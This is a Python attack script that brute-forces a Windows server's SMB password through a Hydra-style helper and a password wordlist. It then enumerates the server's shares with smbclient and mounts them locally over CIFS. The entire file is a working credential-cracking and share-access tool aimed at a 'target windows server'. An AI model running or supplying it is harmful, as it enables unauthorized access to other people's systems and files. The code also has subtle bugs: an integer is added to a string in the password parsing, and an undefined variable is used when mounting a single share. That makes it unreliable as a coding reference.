import argparse as ag
import os 
from subprocess import call
import sys
import shutil
from contextlib import redirect_stdout
from pathlib import Path

def parseVulnerabilitiesFile(f):
	mountpoints = []
	lines = f.readlines()
	#print (lines)
	for i in range(3,len(lines)):
		line = lines[i]
		#print (line)
		name = line.split()[0]
		if(name == "Reconnecting"):
			break
		if(not name.endswith("$")):
			mountpoints.append(name)
		
	return mountpoints

def performAttack(location, serverIP, username, password=None):
	if (password is None):
		f=open("password.txt", "w")
		call(["python3", "hyd.py", "-u", username, "-p", "passwd.txt", "-i", serverIP], stdout=f)
		f.close()
		f = open("password.txt", "r")
		lines = f.readlines()
		for line in lines:
			#print (line)
			if "[445][smb]" in line:
				words = line.split()
				pwdIndex = words.index("password:")
				endWordIndex = len(words)-pwdIndex
				password = words[pwdIndex+1]
				for i in range(pwdIndex+1, len(password)):
					password += pwdIndex+1
		f.close()
		
		print ("Cracked Password:" + password)
	try:	
		shutil.rmtree(location)	
	except FileNotFoundError:
		pass
	
	f = open('vulnerableMountPoints.txt', 'w')
	#with redirect_stdout(f):

	mountpointParams = ["smbclient", "-U=" + username + "%" + password, "-L", serverIP]
	call (mountpointParams, stdout=f)
	f.close()
	f = open('vulnerableMountPoints.txt', 'r')
	mountpoints = parseVulnerabilitiesFile(f)
	if len(mountpoints) == 0:
		print ("No mountpoint found")
	f.close()
	if len(mountpoints) > 1:
		os.mkdir(location)
		lastFolder = str.split(location, "/")
		lastFolder = lastFolder[len(lastFolder)-1]
		location = location + "/" + lastFolder
		for i in range(len(mountpoints)):
			mountpoint = mountpoints[i]
			tempLocation = location + "-" + str(i)
			os.mkdir(tempLocation)
			mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, tempLocation]
			call(mountArgs)
			print ("remote filesystem " + serverIP + "/" + mountpoint + "is mounted at " + tempLocation)
	else:
		os.mkdir(location)
		mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
		call(mountArgs)
		print ("remote filesystem " + serverIP + "/" + mountpoint + "is mounted at " + location)
		

def bruteForcePassword():
	return "bruteForcePassword"
parser = ag.ArgumentParser()
parser.add_argument('--mountloc', type=str, help="Enter the location to mount the system")
parser.add_argument('--serverIP', type=str, help="Enter the name of the targer windows server")
parser.add_argument('--username', type=str, help="Enter the username of the target windows server")
parser.add_argument('--password', type=str, help="Optional. Enter the password of the target windows server. If not included, password will be brute forced.")


args = parser.parse_args()
if args.password:
	performAttack(args.mountloc, args.serverIP, args.username, args.password)
else:
	performAttack(args.mountloc, args.serverIP, args.username)

